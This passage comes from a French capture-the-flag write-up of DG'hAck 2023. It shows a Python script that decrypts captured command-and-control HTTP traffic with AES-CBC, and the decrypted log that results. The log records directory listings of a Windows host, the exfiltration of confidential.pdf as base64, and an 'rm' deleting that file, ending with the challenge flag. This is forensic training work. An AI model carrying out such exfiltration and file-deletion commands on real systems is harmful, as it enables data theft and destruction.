+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(self<span style="color:#f92672">.</span>key,AES<span style="color:#f92672">.</span>MODE_CBC,self<span style="color:#f92672">.</span>IV)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>cipher<span style="color:#f92672">.</span>decrypt(data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> packet <span style="color:#f92672">in</span> cap:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        post_data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(packet<span style="color:#f92672">.</span>http<span style="color:#f92672">.</span>data)
+</span></span><span style="display:flex;"><span>        deciphered <span style="color:#f92672">=</span> decipher_packet(post_data)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Le contenu exfiltré commence au 12ème byte</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> deciphered[<span style="color:#ae81ff">12</span>:]
+</span></span><span style="display:flex;"><span>        print(base64<span style="color:#f92672">.</span>b64decode(payload)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Le premier paquet étant chiffré avec la staging key, on peut avoir une erreur</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ValueError</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python main.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;directory_path&#34;</span>:<span style="color:#e6db74">&#34;/&#34;</span>,<span style="color:#e6db74">&#34;directory_name&#34;</span>:<span style="color:#e6db74">&#34;/&#34;</span>,<span style="color:#e6db74">&#34;items&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;C:\\&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}]}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;directory_path&#34;</span>:<span style="color:#e6db74">&#34;C:\\&#34;</span>,<span style="color:#e6db74">&#34;directory_name&#34;</span>:<span style="color:#e6db74">&#34;C:\\&#34;</span>,<span style="color:#e6db74">&#34;items&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Configure-WindowsHostname.ps1&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Configure-WindowsHostname.ps1&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Configure-WindowsNetwork.ps1&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Configure-WindowsNetwork.ps1&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\DumpStack.log.tmp&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;DumpStack.log.tmp&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\error_hostname.txt&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;error_hostname.txt&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\error_networking.txt&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;error_networking.txt&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\pagefile.sys&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;pagefile.sys&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\swapfile.sys&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;swapfile.sys&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\</span>$Recycle<span style="color:#e6db74">.Bin&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;</span>$Recycle<span style="color:#e6db74">.Bin&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\</span>$WinREAgent<span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;</span>$WinREAgent<span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Documents and Settings&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Documents and Settings&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\PerfLogs&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;PerfLogs&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Program Files&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Program Files&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Program Files (x86)&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Program Files (x86)&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\ProgramData&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ProgramData&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Recovery&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Recovery&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\System Volume Information&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;System Volume Information&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Users&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Windows&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Windows&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Windows.old&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Windows.old&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}]}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;directory_path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users&#34;</span>,<span style="color:#e6db74">&#34;directory_name&#34;</span>:<span style="color:#e6db74">&#34;Users&#34;</span>,<span style="color:#e6db74">&#34;items&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\desktop.ini&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;desktop.ini&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\Admin&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Admin&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\All Users&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;All Users&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;cesar&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\Default&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Default&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\Default User&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Default User&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\lade&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;lade&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\Public&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Public&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}]}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;directory_path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar&#34;</span>,<span style="color:#e6db74">&#34;directory_name&#34;</span>:<span style="color:#e6db74">&#34;cesar&#34;</span>,<span style="color:#e6db74">&#34;items&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\DumpIt.exe&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;DumpIt.exe&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\NTUSER.DAT&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;NTUSER.DAT&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\ntuser.dat.LOG1&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ntuser.dat.LOG1&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\ntuser.dat.LOG2&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ntuser.dat.LOG2&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TM.blf&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TM.blf&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TMContainer00000000000000000001.regtrans-ms&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TMContainer00000000000000000001.regtrans-ms&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TMContainer00000000000000000002.regtrans-ms&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TMContainer00000000000000000002.regtrans-ms&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\ntuser.ini&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ntuser.ini&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\WIN10-20230708-191412.raw&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;WIN10-20230708-191412.raw&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\3D Objects&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;3D Objects&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\AppData&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;AppData&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Application Data&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Application Data&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Contacts&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Contacts&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Cookies&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Cookies&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Desktop&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Desktop&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Documents&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Documents&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Downloads&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Downloads&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Favorites&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Favorites&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Links&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Links&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Local Settings&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Local Settings&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Music&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Music&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\My Documents&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;My Documents&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\NetHood&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;NetHood&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\OneDrive&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;OneDrive&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Pictures&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Pictures&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\PrintHood&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;PrintHood&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Recent&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Recent&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Saved Games&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Saved Games&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Searches&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Searches&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\SendTo&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;SendTo&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Start Menu&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Start Menu&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Templates&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Templates&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Videos&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;Videos&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:false<span style="color:#f92672">}]}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;directory_path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Desktop&#34;</span>,<span style="color:#e6db74">&#34;directory_name&#34;</span>:<span style="color:#e6db74">&#34;Desktop&#34;</span>,<span style="color:#e6db74">&#34;items&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Desktop\\confidential.pdf&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;confidential.pdf&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Desktop\\desktop.ini&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;desktop.ini&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;C:\\Users\\cesar\\Desktop\\photoshop.exe&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;photoshop.exe&#34;</span>,<span style="color:#e6db74">&#34;is_file&#34;</span>:true<span style="color:#f92672">}]}</span>
+</span></span><span style="display:flex;"><span>0|C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\c</span>esar<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\c</span>onfidential.pdf|12510|JVBERi0xLjYK...ZWYKMTIwMjYKJSVFT0YK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> File download of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\c</span>esar<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\c</span>onfidential.pdf completed
+</span></span><span style="display:flex;"><span>executed rm  C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\c</span>esar<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\c</span>onfidential.pdf
+</span></span></code></pre></div><p>Après décodage du base64 récupéré nous obtenons un fichier pdf contenant ces informations
+<img src="/img/l1l2/pdf.png" alt=""></p>
+<p>Flag : <code>DGHACK{4_Gr3P_4nD_7h3_3mP1r3_f411S}</code></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Categories</a></li>
+         
+          <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#extraction-de-la-session-key-grâce-au-dump-mémoire">Extraction de la session key grâce au dump mémoire</a></li>
+        <li><a href="#à-la-recherche-de-liv">À la recherche de l&rsquo;IV</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&text=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&title=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Linkedin">
